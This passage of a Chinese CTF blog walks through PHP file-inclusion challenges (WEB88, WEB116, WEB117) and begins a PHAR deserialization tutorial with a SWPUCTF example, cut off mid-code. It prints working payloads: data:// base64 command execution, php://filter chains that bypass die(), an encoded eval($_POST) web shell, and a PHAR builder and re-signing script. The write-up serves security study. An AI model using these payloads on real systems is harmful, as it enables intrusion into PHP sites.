class="hljs-comment">//编码之后：</span><br>?file=php%<span class="hljs-number">253</span>A%<span class="hljs-number">252</span>F%<span class="hljs-number">252</span>Ffilter%<span class="hljs-number">252</span>Fwrite%<span class="hljs-number">253</span>Dstring%<span class="hljs-number">252</span>Erot13%<span class="hljs-number">252</span>Fresource%<span class="hljs-number">253</span>D2%<span class="hljs-number">252</span>Ephp <span class="hljs-comment">//用burpsuite彻底编码</span><br><br><span class="hljs-comment">//传入内容：</span><br>content=<span class="hljs-meta">&lt;?</span>cuc <span class="hljs-title function_ invoke__">flfgrz</span>(<span class="hljs-string">&#x27;gnp sy*.cuc&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="WEB88"><a href="#WEB88" class="headerlink" title="WEB88"></a>WEB88</h4><h5 id="题目：-4"><a href="#题目：-4" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><h5 id="考察点：-4"><a href="#考察点：-4" class="headerlink" title="考察点："></a>考察点：</h5><p>过滤绕过，伪协议</p><h5 id="详解：-6"><a href="#详解：-6" class="headerlink" title="详解："></a>详解：</h5><p>没有过滤冒号，直接data伪协议，因为要过滤一些符号了，我们需要base64编码，这个题的关键就在于构造出来没有符号的base64编码，不断调试即可</p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">?file=data:<span class="hljs-comment">//text/plian;base64,&lt;?php system(&#x27;tac fl*&#x27;)?&gt;</span><br>    <br><span class="hljs-comment">//最终试出来：</span><br>?file=data:<span class="hljs-comment">//text/plian;base64,&lt;?php system(&#x27;tac fl*&#x27;)?&gt;aaaaa</span><br><br>?file=data:<span class="hljs-comment">//text/plian;base64,PD9waHAgc3lzdGVtKCd0YWMgZmwqJyk/PmFhYWFh</span><br></code></pre></td></tr></table></figure><p>贴图：</p><p><img src="https://note.youdao.com/yws/api/personal/file/WEB773ec5ea11d039b8e4065539242a85e3?method=download&shareKey=eaecfdd4c2d38489dd8538c4029f1383" alt="image-20240612173616269"></p><h4 id="WEB116"><a href="#WEB116" class="headerlink" title="WEB116"></a>WEB116</h4><h5 id="题目：-5"><a href="#题目：-5" class="headerlink" title="题目："></a>题目：</h5><p><img src="https://note.youdao.com/yws/api/personal/file/WEB215f740c5dfc27457e9556bc44683ed5?method=download&shareKey=df1afa65f100963488062b828b2703f9" alt="image-20240612174006166"></p><p>很新的文件题，打开是一个视频文件（剪裁的挺好）</p><h5 id="考察点"><a href="#考察点" class="headerlink" title="考察点"></a>考察点</h5><p>misc+php，文件读取</p><h5 id="详解：-7"><a href="#详解：-7" class="headerlink" title="详解："></a>详解：</h5><p>看源代码没什么思路，想法就是直接把视频文件下载下来，找各种工具把这个流文件下载下来，另存为视频格式到本地。</p><p>然后用010打开发现有PNG图片，导出看一下</p><p><img src="https://note.youdao.com/yws/api/personal/file/WEBda0d7af752027ae1bff1dd8a55e93896?method=download&shareKey=a76258fd845d65a31b7ed6e8276c1b8c" alt="00cf6926ee0ba4afe6f9fa6a33a271b"></p><p>发现源码后</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$x</span></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|https|data|input|rot13|base64 string|log|sess/i&#x27;</span>,<span class="hljs-variable">$x</span>))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;too young too simple sometimes native!&#x27;</span>);&#125;<br><span class="hljs-variable">$file</span>=<span class="hljs-keyword">isset</span>($ GET[<span class="hljs-string">&#x27;file&#x27;</span>l)?$ GET[<span class="hljs-string">&#x27;file&#x27;</span>]:<span class="hljs-string">&quot;sp2.mp4&quot;</span>;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;content-Type:video/mp4&#x27;</span>);<br><span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>作了一些基本的过滤，我们可以不断文件读取访问，然后去网站查看一下网络状态，但发现没什么回显后，抓包读取一下，访问即可有回显</p><p><img src="https://note.youdao.com/yws/api/personal/file/WEB3e9eba1c1b5abfcb629451ad50f8cf5a?method=download&shareKey=8e0f1409a6c236cb613af3161ecf3b0e" alt="8043f6febdedff589262df23988c3af"></p><h4 id="WEB117"><a href="#WEB117" class="headerlink" title="WEB117"></a>WEB117</h4><h5 id="题目：-6"><a href="#题目：-6" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$x</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="hljs-variable">$x</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;too young too simple sometimes naive!&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$contents</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;contents&#x27;</span>];<br><span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="hljs-variable">$contents</span>); <br></code></pre></td></tr></table></figure><h5 id="考察点：-5"><a href="#考察点：-5" class="headerlink" title="考察点："></a>考察点：</h5><p>绕过死亡die,伪协议,写文件fliter协议</p><h5 id="详解：-8"><a href="#详解：-8" class="headerlink" title="详解："></a>详解：</h5><p><code>file_put_contents($file, &quot;&lt;?php die();?&gt;&quot;.$contents);</code> 是一段PHP代码，它的作用是将特定内容写入到一个文件中,把die()拼接到开头</p><p>写文件绕过编码，使用字符转码和编码，通过这种方式把前面正常的代码转化为不正常的内容绕过die，把我们不正常转成正常代码执行即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">?file=php:<span class="hljs-comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=jiuzhen.php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">UCS-2LE.UCS-2BE: 这定义了iconv过滤器的具体任务，即从UCS-2 Little-Endian编码转换到UCS-2 Big-Endian编码。不过，通常这种转换是没有实际意义的，因为它们只是字节序的互换，内容上并不改变字符的表示。可能这是一个示例或者错误配置的例子。 */</span><br>contents=<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//进行一个编码后</span><br>contents=?&lt;hp pe@<span class="hljs-title function_ invoke__">av</span>(l_<span class="hljs-variable">$OPTSj</span>[]z;)&gt;?<br>contents=&lt;hp pvela$(G_TE<span class="hljs-string">&#x27;[mc&#x27;</span>d)]?;&gt;&gt; <span class="hljs-comment">// 多一个&gt;是为了防止报错，&gt;在标签外不解析</span><br><span class="hljs-comment">//会生成shell.php，密码为cmd，可以拿到flag</span><br><br></code></pre></td></tr></table></figure><p>编码转化脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&quot;UCS-2LE&quot;</span>,<span class="hljs-string">&quot;UCS-2BE&quot;</span>, <span class="hljs-string">&#x27;&lt;?php @eval($_POST[a]);?&gt;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;payload:&quot;</span>.<span class="hljs-variable">$result</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//?&lt;hp pe@av(l;)&gt;?</span><br></code></pre></td></tr></table></figure><p>连接蚁剑即可</p><p><img src="https://note.youdao.com/yws/api/personal/file/WEBe44804063d210fa3ebf67ff6e4149a97?method=download&shareKey=59bd79d4c9fbc0dde7158ea4ad7a77c3" alt="image-20240613112257518"></p><h5 id="资源：-1"><a href="#资源：-1" class="headerlink" title="资源："></a>资源：</h5><p><a href="https://www.php.cn/faq/565411.html">https://www.php.cn/faq/565411.html</a>  php支持的字符编码</p>]]></content>
    
    
    <categories>
      
      <category>信息安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WEB-PHAR</title>
    <link href="/2024/06/10/ctfweb%E4%B9%8Bphar/"/>
    <url>/2024/06/10/ctfweb%E4%B9%8Bphar/</url>
    
    <content type="html"><![CDATA[<p>本文讲述web安全里面的phar问题</p><span id="more"></span><h1 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><h3 id="1-什么是phar？"><a href="#1-什么是phar？" class="headerlink" title="1.什么是phar？"></a><strong>1.什么是phar？</strong></h3><p>都知道Jar文件(Jar是Java ARchive的缩写)。一个应用，包括所有的可执行、可访问的文件，都打包进了一个JAR文件里，使得部署过程十分简单。</p><p>而类比PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件。使得php代码等部署更加轻易，应用于ctf层面上的我相信最广泛的无非是phar反序列化。</p><h3 id="2-文件结构"><a href="#2-文件结构" class="headerlink" title="2.文件结构"></a><strong>2.文件结构</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>、Stub<span class="hljs-comment">//Phar文件头</span><br><span class="hljs-number">2</span>、manifest<span class="hljs-comment">//压缩文件信息</span><br><span class="hljs-number">3</span>、contents<span class="hljs-comment">//压缩文件内容</span><br><span class="hljs-number">4</span>、signature<span class="hljs-comment">//签名</span><br></code></pre></td></tr></table></figure><h5 id="Stub"><a href="#Stub" class="headerlink" title="Stub"></a><strong>Stub</strong></h5><p>Stub是Phar的文件标识，也可以理解为它就是Phar的文件头<br>这个Stub其实就是一个简单的PHP文件，它的格式具有一定的要求，具体如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">xxx<span class="hljs-meta">&lt;?php</span> xxx; <span class="hljs-title function_ invoke__">__HALT_COMPILER</span>();<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>前面的内容是不限制的，但在该PHP语句中，必须有<code>__HALT_COMPILER()</code>，没有这个，PHP就无法识别出它是Phar文件。</p><h5 id="manifest"><a href="#manifest" class="headerlink" title="manifest"></a><strong>manifest</strong></h5><p>用于存放文件的属性、权限等信息。<br>这里也是反序列化的攻击点，因为这里以序列化的形式存储了用户自定义的<code>Meta-data</code></p><p><img src="https://note.youdao.com/yws/api/personal/file/WEBa9422d6c776c579202bace162dd45720?method=download&shareKey=3f8e182be5fa3849d0ee3c70d6bbe0f5"></p><h5 id="contents"><a href="#contents" class="headerlink" title="contents"></a><strong>contents</strong></h5><p>用于存放Phar文件的内容</p><h5 id="signature"><a href="#signature" class="headerlink" title="signature"></a><strong>signature</strong></h5><p>签名(可选参数)，位于文件末尾，具体格式如下</p><p><img src="https://note.youdao.com/yws/api/personal/file/WEB1ee2e86f9a0a5e0f0fbd95e2eb5ea3b1?method=download&shareKey=8417416169f6cad143b41416bdeb9dc0"></p><p>签证尾部的<code>01</code>代表md5加密，<code>02</code>代表sha1加密，<code>04</code>代表sha256加密，<code>08</code>代表sha512加密</p><p>当我们修改文件的内容时，签名就会变得无效，这个时候需要<strong>更换一个新的签名</strong><br>更换签名的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha1<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    f = file.read() <br>s = f[:-<span class="hljs-number">28</span>] <span class="hljs-comment"># 获取要签名的数据</span><br>h = f[-<span class="hljs-number">8</span>:] <span class="hljs-comment"># 获取签名类型和GBMB标识</span><br>newf = s + sha1(s).digest() + h <span class="hljs-comment"># 数据 + 签名 + (类型 + GBMB)</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;newtest.phar&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(newf) <span class="hljs-comment"># 写入新文件</span><br></code></pre></td></tr></table></figure><h4 id="3-创建与解读"><a href="#3-创建与解读" class="headerlink" title="3.创建与解读"></a><strong>3.创建与解读</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//我们由以下代码可以创建一个phar文件（大部分这样的）</span><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    &#125;<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">//后缀名必须为phar</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br>    <span class="hljs-variable">$o</span> -&gt; data=<span class="hljs-string">&#x27;hu3sky&#x27;</span>;  <span class="hljs-comment">//动态添加属性</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后点击运行，这样你所在的目录就会出现一个phar的phar文件</p><p><img src="https://note.youdao.com/yws/api/personal/file/WEB8713aa5a75a4ceaea32714bcc95efe80?method=download&shareKey=bb0fc768aa591ec984a8bd2baf6940ce"></p><p>我们把它拖进010看一下：</p><p><img src="https://note.youdao.com/yws/api/personal/file/WEB0af0f95a4cde6b50aa9f473580d42b36?method=download&shareKey=fc1c42a87126a016aa14685c881efbb5"></p><p>很容易发现里面存储的数据是以序列化格式存储的，那么这里就有一个漏洞利用点</p><h2 id="题眼"><a href="#题眼" class="headerlink" title="题眼"></a><strong>题眼</strong></h2><p>文件上传+读取到的php反序列化</p><h2 id="讲解"><a href="#讲解" class="headerlink" title="讲解"></a><strong>讲解</strong></h2><h3 id="1-成因"><a href="#1-成因" class="headerlink" title="1.成因"></a><strong>1.成因</strong></h3><p>Phar之所以能反序列化，是因为Phar文件会以序列化的形式存储用户自定义的<code>meta-data</code>,PHP使用<code>phar_parse_metadata</code>在解析meta数据时，会调用<code>php_var_unserialize</code>进行反序列化操作。</p><p>上传它就相当于一种配置型的一句话木马</p><h3 id="2-利用条件"><a href="#2-利用条件" class="headerlink" title="2.利用条件"></a><strong>2.利用条件</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>、phar文件能够上传至服务器 <br><span class="hljs-comment">//即要求存在file_get_contents()、fopen()这种函数</span><br><br><span class="hljs-number">2</span>、要有可利用的魔术方法<br><span class="hljs-comment">//这个的话用一位大师傅的话说就是利用魔术方法作为&quot;跳板&quot;</span><br><br><span class="hljs-number">3</span>、文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤<br><span class="hljs-comment">//一般利用姿势是上传Phar文件后通过伪协议Phar来实现反序列化，伪协议Phar格式是`Phar://`这种，如果这几个特殊字符被过滤就无法实现反序列化</span><br><br><span class="hljs-number">4</span>、php.ini中的phar.<span class="hljs-keyword">readonly</span>选项，需要为Off（默认是on）。  <span class="hljs-comment">//这里指的是配置问题</span><br></code></pre></td></tr></table></figure><p>Phar属于伪协议，伪协议使用较多的是一些文件操作函数，如<code>fopen()</code>、<code>copy()</code>、<code>file_exists()</code>等，具体如下图，也就是下面的函数如果参数可控可以造成Phar反序列化</p><p><img src="https://note.youdao.com/yws/api/personal/file/WEBdc70ba03be428fdd54880d53d2d4a772?method=download&shareKey=f4c489ac7151a4e553956f7f76bbf7a7"></p><h2 id="构造过程"><a href="#构造过程" class="headerlink" title="构造过程"></a><strong>构造过程</strong></h2><p>明确是phar反序列化–&gt;在本地调试代码（这里分为反序列化链子的构造和phar文件的创建）</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a><strong>例题</strong></h2><h3 id="SWPUCTF-2021-新生赛-babyunser"><a href="#SWPUCTF-2021-新生赛-babyunser" class="headerlink" title="[SWPUCTF 2021 新生赛]babyunser"></a><strong>[SWPUCTF 2021 新生赛]babyunser</strong></h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a><strong>题目</strong></h4><p><img src="https://note.youdao.com/yws/api/personal/file/WEBefd149833595d43e24548b0ee7aa4db1?method=download&shareKey=94761bb8a75fc6818441331fa17c3bb1"></p><h4 id="解释"><a href="#解释" class="headerlink" title="解释"></a><strong>解释</strong></h4><p>通过起初的简单上传木马文件和查看得到如下结果：</p><p><img src="https://note.youdao.com/yws/api/personal/file/WEB8e03ed29a3e9d3a5902ddaa73022d14d?method=download&shareKey=5692ea4e06edbd3a87f89cc67ad2316c"></p><p>1.上传的php木马文件被解析成txt文件，而并没有警告非合理文件上传</p><p>2.通过上传和查阅</p><p><img src="https://note.youdao.com/yws/api/personal/file/WEB42d0ce937f5468cafcdb9af4dcff2354?method=download&shareKey=f0a83b5734e35fcab870bed6fa0ff99a"></p><p>1)传上去的文件并没有发生存储（这里有想到条件竞争，但是并没有警告上传的非法文件）</p><p>2)read.php与upload.php可以读取源码，而且在read.php里面发现至关重要的一点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">aa</span>();<br></code></pre></td></tr></table></figure><p>3）读取class.php的源码，发现是类似于php序列化以及反序列化的题型</p><p>接下来进行链子构造，贴出源码：</p><p>read.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$filename</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$filename</span>))&#123;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-variable">$file</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">zz</span>(<span class="hljs-variable">$filename</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">getFile</span>();  <br> <span class="hljs-comment">//这里有一个getfile()的重要函数，对照进去class.php的zz类存在这个函数，这样就能联结起来了</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$upload_path</span> = <span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">time</span>()) . <span class="hljs-string">&quot;.txt&quot;</span>;<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<span class="hljs-comment">//这里可以读到为什么是txt格式了</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$upload_path</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件路径：&quot;</span> . <span class="hljs-variable">$upload_path</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传失败&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>（附加：【文件究竟怎么被处理了】</p><ol><li><code>$upload_path = &quot;upload/&quot; . md5(time()) . &quot;.txt&quot;;</code>: 这一行创建了一个文件上传的路径。它使用了当前时间的 MD5 散列值来生成唯一的文件名，并将文件保存在名为 “upload&#x2F;“ 的目录下，并以 “.txt” 作为文件扩展名。</li><li><code>$temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</code>: 这里获取了上传文件的临时文件名。通常，上传的文件首先被存储在服务器的临时目录中。</li><li><code>if (move_uploaded_file($temp_file, $upload_path)) &#123;</code>: 这个条件语句检查是否成功将上传的文件从临时目录移动到指定的上传路径。</li></ol><p>）</p><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">aa</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-string">&#x27;aa&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$this</span>-&gt;name);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ff</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$content</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable 